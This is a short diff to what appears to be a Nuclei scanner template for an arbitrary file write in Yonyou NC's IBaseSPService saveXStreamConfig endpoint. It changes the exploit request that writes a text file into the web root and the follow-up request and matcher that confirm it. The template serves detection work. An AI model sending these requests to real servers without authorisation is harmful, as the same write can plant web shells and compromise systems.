@@ -25,14 +25,14 @@ http:
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
         Content-Type: application/json
 
-        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["hello","webapps/nc_web/hello.txt"]}
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["hello world","webapps/nc_web/1nfo.txt"]}
 
       - |
-        GET /hello.txt HTTP/1.1
+        GET /1nfo.txt HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
       - type: word
         words:
-          - hello 
+          - hello world
         part: body
